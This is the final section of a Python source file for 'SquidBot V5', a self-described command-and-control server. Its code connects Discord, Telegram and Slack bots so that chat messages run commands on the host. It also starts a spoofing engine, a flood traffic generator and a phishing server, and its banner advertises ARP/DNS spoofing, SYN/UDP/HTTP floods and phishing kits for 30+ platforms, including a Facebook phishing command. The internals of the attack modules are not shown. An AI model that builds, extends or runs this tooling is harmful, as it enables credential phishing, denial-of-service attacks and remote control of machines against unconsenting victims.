        self.bot = commands.Bot(command_prefix='!', intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.GREEN}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            
            if message.content.startswith('!'):
                cmd = message.content[1:].strip()
                result = self.handler.execute_command(cmd, f"discord/{message.author.name}")
                
                output = result.get('output', '')
                if len(output) > 1900:
                    output = output[:1900] + "...\n(truncated)"
                
                embed = discord.Embed(
                    title="🐙 SquidBot Response",
                    description=f"```{output}```",
                    color=0x5865F2
                )
                embed.set_footer(text=f"Execution time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            
            await self.bot.process_commands(message)
        
        return True
    
    def start(self):
        """Start Discord bot"""
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            self.bot.run(self.config['discord_token'])
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class SquidBotTelegram:
    """Telegram bot integration"""
    
    def __init__(self, handler: BotHandler, config: Dict):
        self.handler = handler
        self.config = config
        self.client = None
        self.running = False
    
    def setup(self):
        """Setup Telegram bot"""
        if not TELETHON_AVAILABLE:
            return False
        
        if not self.config.get('telegram_api_id') or not self.config.get('telegram_api_hash'):
            return False
        
        self.client = TelegramClient('squidbot_session', 
                                     self.config['telegram_api_id'],
                                     self.config['telegram_api_hash'])
        
        @self.client.on(events.NewMessage)
        async def handler(event):
            if event.message.text and event.message.text.startswith('/'):
                cmd = event.message.text[1:].strip()
                result = self.handler.execute_command(cmd, f"telegram/{event.sender_id}")
                
                output = result.get('output', '')
                if len(output) > 4000:
                    output = output[:3900] + "\n... (truncated)"
                
                await event.reply(f"```{output}```\n*Time: {result.get('execution_time', 0):.2f}s*", parse_mode='markdown')
        
        return True
    
    def start(self):
        """Start Telegram bot"""
        if self.client:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                await self.client.start(bot_token=self.config.get('telegram_bot_token'))
                print(f"{Colors.GREEN}✅ Telegram bot connected{Colors.RESET}")
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# SLACK BOT
# =====================
class SquidBotSlack:
    """Slack bot integration"""
    
    def __init__(self, handler: BotHandler, config: Dict):
        self.handler = handler
        self.config = config
        self.client = None
        self.running = False
    
    def setup(self):
        """Setup Slack bot"""
        if not SLACK_AVAILABLE:
            return False
        
        if not self.config.get('slack_token'):
            return False
        
        self.client = WebClient(token=self.config['slack_token'])
        return True
    
    def start(self):
        """Start Slack bot"""
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
    
    def _monitor(self):
        """Monitor Slack for messages"""
        import time
        last_ts = None
        
        while self.running:
            try:
                response = self.client.conversations_history(
                    channel=self.config.get('slack_channel', 'general'),
                    limit=1
                )
                
                if response['ok'] and response['messages']:
                    msg = response['messages'][0]
                    if msg.get('text', '').startswith('!'):
                        if last_ts != msg.get('ts'):
                            last_ts = msg.get('ts')
                            cmd = msg['text'][1:].strip()
                            result = self.handler.execute_command(cmd, f"slack/{msg.get('user', 'unknown')}")
                            
                            self.client.chat_postMessage(
                                channel=self.config.get('slack_channel', 'general'),
                                text=f"```{result.get('output', '')[:2000]}```\nExecution time: {result.get('execution_time', 0):.2f}s"
                            )
                
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)

# =====================
# MAIN APPLICATION
# =====================
class SquidBot:
    """Main application class"""
    
    def __init__(self):
        # Load configuration
        self.config = self._load_config()
        
        # Initialize components
        self.db = DatabaseManager()
        self.spoof_engine = SpoofingEngine(self.db)
        self.traffic_gen = AdvancedTrafficGenerator(self.db)
        self.phishing_server = PhishingServer(self.db)
        self.handler = BotHandler(self.db, self.spoof_engine, self.traffic_gen, self.phishing_server)
        
        # Initialize bots
        self.discord_bot = SquidBotDiscord(self.handler, self.config)
        self.telegram_bot = SquidBotTelegram(self.handler, self.config)
        self.slack_bot = SquidBotSlack(self.handler, self.config)
        
        self.running = True
    
    def _load_config(self) -> Dict:
        """Load configuration"""
        default_config = {
            'discord_token': '',
            'telegram_api_id': '',
            'telegram_api_hash': '',
            'telegram_bot_token': '',
            'slack_token': '',
            'slack_channel': 'general'
        }
        
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    return {**default_config, **config}
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        
        return default_config
    
    def save_config(self):
        """Save configuration"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self.config, f, indent=4)
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
    
    def print_banner(self):
        """Print banner"""
        banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.PURPLE}        🐙 SQUIDBOT V5 - Ultimate Cybersecurity Command & Control Server    {Colors.CYAN}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.BLUE}  • 5000+ Security Commands          • Nmap / Curl / Wget / Netcat / SSH   {Colors.CYAN}║
║{Colors.BLUE}  • Advanced Network Spoofing        • IP/MAC/ARP/DNS Spoofing              {Colors.CYAN}║
║{Colors.BLUE}  • Flood Generation (ICMP/SYN/UDP)  • HTTP Flood / Traffic Analysis        {Colors.CYAN}║
║{Colors.BLUE}  • Phishing Suite (30+ Platforms)   • Discord/Telegram/Slack Bots          {Colors.CYAN}║
║{Colors.BLUE}  • SSH Remote Access                • Multi-Platform Integration           {Colors.CYAN}║
║{Colors.BLUE}  • Real-time Threat Detection       • Graphical Reports & Statistics       {Colors.CYAN}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}💡 Type 'help' for command list{Colors.RESET}
{Colors.YELLOW}🔧 Type 'status' for system status{Colors.RESET}
{Colors.CYAN}🎣 Type 'generate_phishing_for_facebook' for phishing link{Colors.RESET}
{Colors.PURPLE}💥 Type 'icmp_flood 192.168.1.1 30' for flood test{Colors.RESET}
        """
        print(banner)
    
    def setup_bots(self):
        """Setup and start bots"""
        print(f"\n{Colors.CYAN}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
        
        # Discord
        if not self.config.get('discord_token'):
            token = input(f"{Colors.YELLOW}Enter Discord bot token (or press Enter to skip): {Colors.RESET}").strip()
            if token:
                self.config['discord_token'] = token
                self.save_config()
        
        if self.config.get('discord_token') and self.discord_bot.setup():
            self.discord_bot.start()
            print(f"{Colors.GREEN}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        if not self.config.get('telegram_api_id') or not self.config.get('telegram_api_hash'):
            api_id = input(f"{Colors.YELLOW}Enter Telegram API ID (or press Enter to skip): {Colors.RESET}").strip()
            if api_id:
                self.config['telegram_api_id'] = api_id
                self.config['telegram_api_hash'] = input(f"{Colors.YELLOW}Enter Telegram API Hash: {Colors.RESET}").strip()
                self.config['telegram_bot_token'] = input(f"{Colors.YELLOW}Enter Telegram Bot Token (optional): {Colors.RESET}").strip()
                self.save_config()
        
        if self.config.get('telegram_api_id') and self.telegram_bot.setup():
            self.telegram_bot.start()
            print(f"{Colors.GREEN}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        if not self.config.get('slack_token'):
            token = input(f"{Colors.YELLOW}Enter Slack bot token (or press Enter to skip): {Colors.RESET}").strip()
            if token:
                self.config['slack_token'] = token
                self.config['slack_channel'] = input(f"{Colors.YELLOW}Enter Slack channel name (default: general): {Colors.RESET}").strip() or 'general'
                self.save_config()
        
        if self.config.get('slack_token') and self.slack_bot.setup():
            self.slack_bot.start()
            print(f"{Colors.GREEN}✅ Slack bot starting...{Colors.RESET}")
    
    def run(self):
        """Main application loop"""
        # Clear screen and show banner
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        # Setup bots
        self.setup_bots()
        
        print(f"\n{Colors.GREEN}✅ System ready! Type 'help' for commands.{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.PURPLE}🐙 SquidBot V5 running...{Colors.RESET}\n")
        
        # Main command loop
        while self.running:
            try:
                prompt = f"{Colors.CYAN}🐙{Colors.RESET} "
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit':
                    self.running = False
                    print(f"{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
                    break
                
                elif command.lower() == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_banner()
                    continue
                
                # Execute command
                result = self.handler.execute_command(command)
                
                if result.get('success'):
                    output = result.get('output', '')
                    if isinstance(output, dict):
                        output = json.dumps(output, indent=2)
                    
                    print(output)
                    if result.get('execution_time'):
                        print(f"\n{Colors.GREEN}✅ Executed in {result['execution_time']:.2f}s{Colors.RESET}")
                else:
                    print(f"{Colors.RED}❌ Error: {result.get('output', 'Unknown error')}{Colors.RESET}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.phishing_server.stop()
        self.spoof_engine.stop_spoofing()
        self.traffic_gen.stop_generation()
        self.db.close()
        
        print(f"\n{Colors.GREEN}✅ Shutdown complete.{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        # Check Python version
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7 or higher required{Colors.RESET}")
            sys.exit(1)
        
        # Check for root privileges
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            print(f"{Colors.YELLOW}⚠️  Warning: Running without root privileges{Colors.RESET}")
            print(f"{Colors.YELLOW}   Some features (ARP spoofing, MAC spoofing) require root{Colors.RESET}")
            print(f"{Colors.YELLOW}   Run with sudo for full functionality{Colors.RESET}")
            time.sleep(2)
        
        # Create and run application
        app = SquidBot()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()